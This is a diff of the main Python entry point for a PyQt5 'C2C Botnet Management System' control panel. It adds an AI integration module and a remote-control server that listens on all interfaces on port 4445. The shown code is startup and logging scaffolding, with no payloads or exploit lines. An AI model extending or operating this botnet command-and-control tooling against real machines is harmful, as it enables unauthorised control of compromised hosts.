@@ -2,15 +2,18 @@
 # -*- coding: utf-8 -*-
 """
 C2C Botnet Management System - Main Entry Point
-Modular GUI Application
+Integrated Application with AI and Remote Control
 """
 
 import sys
 import os
+import threading
+import time
+import logging
 
 # Set Qt attributes BEFORE creating QApplication
 from PyQt5.QtCore import Qt
-from PyQt5.QtWidgets import QApplication
+from PyQt5.QtWidgets import QApplication, QMessageBox
 
 # Must set these attributes before QApplication is created
 QApplication.setAttribute(Qt.AA_EnableHighDpiScaling, True)
@@ -24,14 +27,228 @@ from PyQt5.QtGui import QIcon
 # Import GUI module
 from gui import MainWindow
 
+# Import AI and Remote Control
+try:
+    from ai_integration import get_ai_manager, initialize_ai_integration
+    AI_AVAILABLE = True
+    print("✅ AI Integration module loaded successfully")
+except ImportError as e:
+    print(f"⚠️ AI Integration not available: {e}")
+    AI_AVAILABLE = False
+
+try:
+    from remote_control import RemoteController
+    REMOTE_CONTROL_AVAILABLE = True
+    print("✅ Remote Control module loaded successfully")
+except ImportError as e:
+    print(f"⚠️ Remote Control not available: {e}")
+    REMOTE_CONTROL_AVAILABLE = False
+
+# Setup logging
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    handlers=[
+        logging.FileHandler('c2c_main.log'),
+        logging.StreamHandler()
+    ]
+)
+
+class IntegratedC2CApplication:
+    """Integrated C2C Application with GUI, AI, and Remote Control"""
+    
+    def __init__(self):
+        self.logger = logging.getLogger('IntegratedC2C')
+        
+        # Core components
+        self.gui_window = None
+        self.ai_manager = None
+        self.remote_controller = None
+        
+        # Status tracking
+        self.components_status = {
+            'gui': False,
+            'ai': False,
+            'remote_control': False
+        }
+        
+    def initialize_ai_system(self):
+        """Initialize AI Integration System"""
+        if not AI_AVAILABLE:
+            self.logger.warning("AI Integration not available")
+            return False
+            
+        try:
+            # Initialize AI with custom config
+            ai_config = {
+                'auto_learning': True,
+                'insight_generation': True,
+                'performance_tracking': True,
+                'model_persistence': True,
+                'update_interval': 30,
+                'max_insights': 100,
+                'confidence_threshold': 0.7
+            }
+            
+            self.ai_manager = initialize_ai_integration(ai_config)
+            self.components_status['ai'] = True
+            
+            self.logger.info("🤖 AI Integration System initialized successfully")
+            return True
+            
+        except Exception as e:
+            self.logger.error(f"❌ Error initializing AI system: {e}")
+            return False
+            
+    def initialize_remote_control(self):
+        """Initialize Remote Control Server"""
+        if not REMOTE_CONTROL_AVAILABLE:
+            self.logger.warning("Remote Control not available")
+            return False
+            
+        try:
+            # Initialize remote controller on port 4445
+            self.remote_controller = RemoteController(host='0.0.0.0', port=4445)
+            
+            # Start remote control server in background thread
+            def start_remote_control():
+                try:
+                    if self.remote_controller.start():
+                        self.components_status['remote_control'] = True
+                        self.logger.info("🔐 Remote Control Server started on port 4445")
+                    else:
+                        self.logger.error("❌ Failed to start Remote Control Server")
+                except Exception as e:
+                    self.logger.error(f"❌ Remote Control startup error: {e}")
+                    
+            # Start in background thread
+            remote_thread = threading.Thread(target=start_remote_control, daemon=True)
+            remote_thread.start()
+            
+            return True
+            
+        except Exception as e:
+            self.logger.error(f"❌ Error initializing Remote Control: {e}")
+            return False
+            
+    def initialize_gui(self, app):
+        """Initialize GUI with integrated components"""
+        try:
+            # Create main window with integrated components
+            self.gui_window = MainWindow()
+            
+            # Inject AI manager into GUI if available
+            if self.ai_manager and hasattr(self.gui_window, 'set_ai_manager'):
+                self.gui_window.set_ai_manager(self.ai_manager)
+                self.logger.info("🔗 AI Manager integrated into GUI")
+                
+            # Inject remote controller into GUI if available
+            if self.remote_controller and hasattr(self.gui_window, 'set_remote_controller'):
+                self.gui_window.set_remote_controller(self.remote_controller)
+                self.logger.info("🔗 Remote Controller integrated into GUI")
+                
+            self.components_status['gui'] = True
+            self.logger.info("🎨 GUI initialized successfully")
+            return True
+            
+        except Exception as e:
+            self.logger.error(f"❌ Error initializing GUI: {e}")
+            return False
+            
+    def start_application(self, app):
+        """Start the integrated application"""
+        try:
+            # Show startup status
+            self.show_startup_status()
+            
+            # Show main window
+            self.gui_window.show()
+            
+            # Show integration status in GUI
+            self.update_gui_status()
+            
+            self.logger.info("🚀 C2C Integrated Application started successfully!")
+            return True
+            
+        except Exception as e:
+            self.logger.error(f"❌ Error starting application: {e}")
+            return False
+            
+    def show_startup_status(self):
+        """Show startup status"""
+        print("\n" + "="*60)
+        print("🚀 C2C Botnet Management System - Integrated Mode")
+        print("="*60)
+        
+        # Component status
+        print("\n📊 Component Status:")
+        print(f"   🎨 GUI: {'✅ Active' if self.components_status['gui'] else '❌ Failed'}")
+        print(f"   🤖 AI System: {'✅ Active' if self.components_status['ai'] else '❌ Not Available'}")
+        print(f"   🔐 Remote Control: {'✅ Active' if self.components_status['remote_control'] else '❌ Not Available'}")
+        
+        # Capabilities summary
+        active_components = sum(self.components_status.values())
+        print(f"\n🎯 Active Components: {active_components}/3")
+        
+        if self.components_status['ai']:
+            print("   • AI-powered bot optimization")
+            print("   • Intelligent threat detection")
+            print("   • Performance analytics")
+            
+        if self.components_status['remote_control']:
+            print("   • Secure remote administration")
+            print("   • HMAC authentication")
+            print("   • Session management")
+            
+        print("\n" + "="*60)
+        
+    def update_gui_status(self):
+        """Update GUI with integration status"""
+        try:
+            if not self.gui_window:
+                return
+                
+            # Update status bar if available
+            if hasattr(self.gui_window, 'update_integration_status'):
+                status_info = {
+                    'ai_active': self.components_status['ai'],
+                    'remote_active': self.components_status['remote_control'],
+                    'ai_manager': self.ai_manager,
+                    'remote_controller': self.remote_controller
+                }
+                self.gui_window.update_integration_status(status_info)
+                
+        except Exception as e:
+            self.logger.error(f"Error updating GUI status: {e}")
+            
+    def shutdown(self):
+        """Shutdown all components gracefully"""
+        self.logger.info("🔄 Shutting down C2C Application...")
+        
+        try:
+            # Stop AI monitoring
+            if self.ai_manager:
+                self.ai_manager.stop_monitoring()
+                self.logger.info("🤖 AI System stopped")
+                
+            # Stop remote control
+            if self.remote_controller:
+                self.remote_controller.stop()
+                self.logger.info("🔐 Remote Control stopped")
+                
+            self.logger.info("✅ C2C Application shutdown complete")
+            
+        except Exception as e:
+            self.logger.error(f"❌ Error during shutdown: {e}")
+
 def setup_application():
     """Thiết lập application"""
     app = QApplication(sys.argv)
     
     # Application properties
     app.setApplicationName("C2C Botnet Management System")
-    app.setApplicationDisplayName("C2C Control Panel")
-    app.setApplicationVersion("1.0.0")
+    app.setApplicationDisplayName("C2C Integrated Control Panel")
+    app.setApplicationVersion("2.0.0")
     app.setOrganizationName("C2C Security Research")
     app.setOrganizationDomain("c2c.local")
     
@@ -42,36 +259,70 @@ def setup_application():
     return app
 
 def main():
-    """Main function"""
+    """Main function with integrated components"""
+    c2c_app = None
+    
     try:
-        # Tạo application
+        # Create Qt application
         app = setup_application()
         
-        print("Starting C2C Botnet Management System")
-        print("Initializing main window...")
+        print("🚀 Starting C2C Botnet Management System - Integrated Mode")
+        print("⏳ Initializing components...")
         
-        # Tạo main window
-        window = MainWindow()
+        # Create integrated application
+        c2c_app = IntegratedC2CApplication()
         
-        # Hiển thị window
-        window.show()
-        print("Application started successfully!")
-        print("GUI ready for use")
+        # Initialize components
+        print("\n📦 Initializing AI Integration...")
+        c2c_app.initialize_ai_system()
+        
+        print("📦 Initializing Remote Control...")
+        c2c_app.initialize_remote_control()
+        
+        print("📦 Initializing GUI...")
+        if not c2c_app.initialize_gui(app):
+            raise Exception("Failed to initialize GUI")
+            
+        # Small delay to let background services start
+        time.sleep(1)
+        
+        # Start the application
+        if not c2c_app.start_application(app):
+            raise Exception("Failed to start application")
+            
+        # Handle application shutdown
+        def cleanup_on_exit():
+            if c2c_app:
+                c2c_app.shutdown()
+                
+        app.aboutToQuit.connect(cleanup_on_exit)
         
         # Start event loop
-        return app.exec_()
+        exit_code = app.exec_()
+        
+        # Final cleanup
+        cleanup_on_exit()
+        return exit_code
         
     except ImportError as e:
-        print(f"Import Error: {e}")
-        print("Please install required dependencies:")
+        print(f"❌ Import Error: {e}")
+        print("\n📥 Please install required dependencies:")
         print("   pip install PyQt5 PyQt5-tools")
-        print("   pip install psutil")
+        print("   pip install psutil scikit-learn numpy joblib")
         return 1
         
     except Exception as e:
-        print(f"Application Error: {e}")
+        print(f"❌ Application Error: {e}")
         import traceback
         traceback.print_exc()
+        
+        # Emergency cleanup
+        if c2c_app:
+            try:
+                c2c_app.shutdown()
+            except:
+                pass
+                
         return 1
 
 if __name__ == "__main__":
